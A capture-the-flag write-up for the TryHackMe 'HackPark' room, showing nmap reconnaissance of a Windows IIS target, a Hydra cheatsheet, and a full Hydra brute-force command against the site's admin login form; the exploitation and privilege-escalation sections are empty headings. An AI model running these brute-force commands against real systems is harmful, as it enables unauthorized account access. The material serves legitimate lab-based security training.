# HackPark

| [![Jenkins](../../_static/images/it.png)](https://tryhackme.com/room/hackpark) |
|:--:|
| [https://tryhackme.com/room/hackpark](https://tryhackme.com/room/hackpark) |

SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate privileges to root.

## Brute-force login with Hydra

### Scanning

First run a simple port scan (without Ping)

	nmap -Pn -p- <IP address target machine> -oN portscan

portscan:

    # Nmap 7.92 scan initiated Fri Sep 30 01:06:47 2022 as: nmap -Pn -p- -oN portscan 10.10.104.183
    Nmap scan report for 10.10.104.183
    Host is up (0.039s latency).
    Not shown: 65533 filtered tcp ports (no-response)
    PORT     STATE SERVICE
    80/tcp   open  http
    3389/tcp open  ms-wbt-server
    
    # Nmap done at Fri Sep 30 01:08:46 2022 -- 1 IP address (1 host up) scanned in 119.37 seconds

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p80,3389 <IP address target machine> -oN servicescan

servicescan:

    # Nmap 7.92 scan initiated Fri Sep 30 01:12:20 2022 as: nmap -Pn -T4 -A -p80,3389 -oN servicescan 10.10.104.183
    Nmap scan report for 10.10.104.183
    Host is up (0.039s latency).
    
    PORT     STATE SERVICE            VERSION
    80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-IIS/8.5
    |_http-title: hackpark | hackpark amusements
    | http-methods: 
    |_  Potentially risky methods: TRACE
    | http-robots.txt: 6 disallowed entries 
    | /Account/*.* /search /search.aspx /error404.aspx 
    |_/archive /archive.aspx
    3389/tcp open  ssl/ms-wbt-server?
    | rdp-ntlm-info: 
    |   Target_Name: HACKPARK
    |   NetBIOS_Domain_Name: HACKPARK
    |   NetBIOS_Computer_Name: HACKPARK
    |   DNS_Domain_Name: hackpark
    |   DNS_Computer_Name: hackpark
    |   Product_Version: 6.3.9600
    |_  System_Time: 2022-09-30T00:13:35+00:00
    | ssl-cert: Subject: commonName=hackpark
    | Not valid before: 2022-09-29T00:05:48
    |_Not valid after:  2023-03-31T00:05:48
    |_ssl-date: 2022-09-30T00:13:36+00:00; 0s from scanner time.
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2012 (89%)
    OS CPE: cpe:/o:microsoft:windows_server_2012
    Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    TRACEROUTE (using port 80/tcp)
    HOP RTT      ADDRESS
    1   40.18 ms 10.9.0.1
    2   40.14 ms 10.10.104.183
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Sep 30 01:13:36 2022 -- 1 IP address (1 host up) scanned in 76.02 seconds

There is a web server running on port 80/tcp.

### Exploring

A short exploration of the site gave me a username and a login page. 

| ![Welcome to hackpark](../../_static/images/screenshot-hackpark.png)
|:--:|
| Welcome page clues |

A [reverse image search](https://www.reverseimagesearch.com/) gave the name of the clown.
The source code of the main page reveals an `Administrator` user `admin`. But we already knew that.

### Brute-force admin

Identify what type of request the form is making to the webserver by going to the login page.

Copy the URL:

    http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/

Type of request:

    # curl -s http://<IP address target machine>/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
        <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">

Using Burpsuite Intruder, try a brute-force on that `admin` user. Fire up Burpsuite, go to login page, 
set Burpsuite to intercept, and try to log in. Catch the `__VIEWSTATE` for use in Hydra.

Mini hydra cheatsheet:

| Command                                                                                                                                      | Description                                                                                                                                                                  |
|:---------------------------------------------------------------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| hydra -P <wordlist> -v <ip> <protocol>                                                                                                       | Brute force against a protocol of your choice.                                                                                                                               |
| hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>                                                                 | You can use Hydra to bruteforce usernames as well <br/>as passwords. It will loop through every combination <br/>in your lists. (-vV = verbose mode, showing login attempts) |
| hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>                                                                                      | Attack a Windows Remote Desktop with a password <br/>list.                                                                                                                   |
| hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:<br/>log=^USER^&pwd=^PASS^&wp-submit=<br/>Log In&testcookie=1:S=Location' | Craft a more specific request for Hydra <br/>to brute force.                                                                                                                 |

Using the flags:

* `-f` to stop the attack when a valid password is found
* `-l` to specify the username for the bruteforce attack
* `-P` to specify the wordlist to use for the bruteforce
* `http-post-form` to specify the URL including all parameters used in the request, such as the username, password and the failed authentication message

First attempt:

    # hydra -f -l admin -P /usr/share/wordlists/rockyou.txt <IP address target machine> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=admin&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"

## Compromise the machine 

Logged in as admin, click on the "About" link from the menu.

## Privilege escalation

## Privilege escalation without Metasploit 
